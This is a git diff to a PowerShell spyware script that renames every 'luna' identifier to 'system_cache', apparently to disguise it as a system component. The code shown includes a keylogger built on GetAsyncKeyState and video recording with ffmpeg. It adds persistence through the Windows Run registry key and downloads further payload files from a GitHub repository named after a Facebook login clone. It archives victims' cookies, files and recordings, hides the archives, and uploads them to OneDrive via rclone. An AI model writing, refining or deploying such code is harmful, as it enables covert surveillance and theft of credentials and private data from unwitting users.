@@ -1,4 +1,4 @@
-# luna.ps1 - PowerShell Agent: Cookies, Files, Video, Keylogger, AutoStart
+# system_cache.ps1 - PowerShell Agent: Cookies, Files, Video, Keylogger, AutoStart
 
 $serverUrl = "https://onclick-back.onrender.com"
 $tempDir = "$env:TEMP\system_cache"
@@ -102,7 +102,7 @@ function Get-AudioDevice {
 
 function Start-Recording {
     $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
-    $recordingDir = "$env:USERPROFILE\luna_video_fragments"
+    $recordingDir = "$env:USERPROFILE\system_cache_video_fragments"
     if (!(Test-Path $recordingDir)) {
         New-Item -ItemType Directory -Path $recordingDir -Force | Out-Null
     }
@@ -202,7 +202,7 @@ Start-Job -ScriptBlock {
             [DllImport("User32.dll")] public static extern short GetAsyncKeyState(Int32 vKey);
         }'
     $map = @{ 8 = "[Back]"; 13 = "[Enter]"; 32 = " "; 27 = "[Esc]"; 9 = "[Tab]" }
-    $logPath = "$env:TEMP\luna\keylog.txt"
+    $logPath = "$env:TEMP\system_cache\keylog.txt"
     while ($true) {
         for ($i = 1; $i -le 255; $i++) {
             if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
@@ -216,9 +216,9 @@ Start-Job -ScriptBlock {
 
 
 function Ensure-Autostart {
-    $path = "$env:APPDATA\Microsoft\Windows\luna"
-    $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
-    $files = @("luna.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "luna_launcher.bat", "setup.vbs", "luna_launcher.vbs")
+    $path = "$env:APPDATA\Microsoft\Windows\system_cache"
+    $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
+    $files = @("system_cache.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "system_cache_launcher.bat", "setup.vbs", "system_cache_launcher.vbs")
 
     if (!(Test-Path $path)) {
         New-Item -ItemType Directory -Path $path -Force | Out-Null
@@ -236,11 +236,11 @@ function Ensure-Autostart {
         }
     }
 
-    $vbsLauncher = "$path\luna_launcher.vbs"
+    $vbsLauncher = "$path\system_cache_launcher.vbs"
     if (Test-Path $vbsLauncher) {
         try {
             Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-                -Name "luna" -Value $vbsLauncher -ErrorAction Stop
+                -Name "system_cache" -Value $vbsLauncher -ErrorAction Stop
             Write-Output "Autostart via VBS registered: $vbsLauncher"
         } catch {
             Write-Warning ("Failed to set autostart: {0}" -f $_.Exception.Message)
@@ -250,7 +250,7 @@ function Ensure-Autostart {
     }
 }
 
-$sentLog = "$env:TEMP\luna\sent_files.log"
+$sentLog = "$env:TEMP\system_cache\sent_files.log"
 
 function Is-NewFile($path) {
     if (!(Test-Path $sentLog)) { return $true }
@@ -267,12 +267,12 @@ function Archive-And-Report {
     $global:archiveSuccess = $false
     $videoSubDir = "$tempDir\video"
     New-Item -ItemType Directory -Path $videoSubDir -Force -ErrorAction SilentlyContinue | Out-Null
-    $remote = "onedrive:luna_uploads/$username"
-    $rclone = "$env:APPDATA\Microsoft\Windows\luna\rclone.exe"
+    $remote = "onedrive:system_cache_uploads/$username"
+    $rclone = "$env:APPDATA\Microsoft\Windows\system_cache\rclone.exe"
     
     if (Test-Path $rclone) {
         try {
-            & $rclone copy "$zipPath" "$remote" --config "$env:APPDATA\Microsoft\Windows\luna\rclone.conf" --transfers 1 --quiet
+            & $rclone copy "$zipPath" "$remote" --config "$env:APPDATA\Microsoft\Windows\system_cache\rclone.conf" --transfers 1 --quiet
             Write-Output "Upload to OneDrive completed: $remote"
         } catch {
             Write-Warning "Upload failed: $_"
@@ -283,8 +283,8 @@ function Archive-And-Report {
 
     $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
     $user = $env:USERNAME
-    $recordingDir = "$env:USERPROFILE\luna_video_fragments"
-    $zipPath = "$env:USERPROFILE\luna_${user}_$timestamp.zip"
+    $recordingDir = "$env:USERPROFILE\system_cache_video_fragments"
+    $zipPath = "$env:USERPROFILE\system_cache_${user}_$timestamp.zip"
     $meta = "$tempDir\info.txt"
     $report = @{ user = $user; host = $env:COMPUTERNAME; timestamp = $timestamp }
 
@@ -341,11 +341,11 @@ function Archive-And-Report {
         Compress-Archive -Path $pathsToArchive -DestinationPath $zipPath -Force
         Write-Output "Archive created: $zipPath"
 
-        & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
+        & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:system_cache_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
 
             try {
                 (Get-Item $zipPath).Attributes += 'Hidden'
-                Get-ChildItem "$env:USERPROFILE" -Filter "luna_*.zip" |
+                Get-ChildItem "$env:USERPROFILE" -Filter "system_cache_*.zip" |
                     Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) } |
                     Remove-Item -Force -ErrorAction SilentlyContinue
             } catch {
@@ -396,7 +396,7 @@ Machine: $env:COMPUTERNAME
 Time: $timestamp
 Files: $filesCount
 Cookies: $cookiesCount
-Cloud path: onedrive:luna_uploads/$user/$timestamp/
+Cloud path: onedrive:system_cache_uploads/$user/$timestamp/
 Local archive: $zipPath
 "@
 
